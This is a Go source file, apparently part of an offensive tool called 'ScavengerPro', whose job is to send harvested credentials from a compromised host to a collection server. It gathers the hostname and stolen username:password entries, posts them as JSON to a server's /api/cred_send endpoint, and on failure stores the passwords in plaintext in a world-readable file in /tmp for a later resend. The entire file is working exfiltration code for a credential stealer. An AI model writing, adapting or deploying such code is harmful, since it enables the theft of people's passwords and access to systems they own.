// ship the credential cache to the server
// @author: degenerat3

package main

import(
	//"fmt"
	"net/http"
	"bytes"
	"encoding/json"
	"ScavengerPro/client/cred_cache"
	"os"
	"bufio"
	"io/ioutil"
)

var serv = "127.0.0.1:5000" 	//IP of server

func send_data(c cred_cache.CredCache){
	path := "/tmp/cachedump"
	h := c.Get_hostname()
	creds := c.Get_entries()
	previous_dump := fetch_dump(path)
	if previous_dump !=nil{
		for _,c := range previous_dump{
			creds = append(creds, c)
		}
	}
	cred_str := ""
	for _,cd := range creds{
		cred_str += cd + "\n"
	}
	url := "http://" + serv + "/api/cred_send"	//turn ip into URL
	jsonData := map[string]string{"hostname": h, "credentials": cred_str}
	jsonValue, _ := json.Marshal(jsonData)
	_, err := http.Post(url, "application/json", bytes.NewBuffer(jsonValue))
	if err != nil{
		// TODO: write to disk if it fails
		path := "/tmp/cachedump"
		dump_cache(creds, path)
		return
	}

}

func dump_cache(creds []string, path string){
	cstr := ""
	for _, cred := range creds {
		cstr += cred + "\n"
	}
	cbytes := []byte(cstr)
	ioutil.WriteFile(path, cbytes, 0644)
	

	return
}

func fetch_dump(path string) []string{
	f, err := os.Open(path)
	if err != nil {
		return nil
	}
	defer f.Close()
	var data []string
	scanner := bufio.NewScanner(f)
	for scanner.Scan(){
		data = append(data, scanner.Text())
	}
	
	return data
}


func ship_it(c cred_cache.CredCache, min int){
	if c.Count_entries() < min{
		return	// not enough passwords to ship
	}
	send_data(c)
	return
}

func main(){
	c := cred_cache.CredCache {
		Hostname: "malBox",
		Credentials: []string{"jim:letmein","dragon:hunter2"},
	}
	send_data(c)
}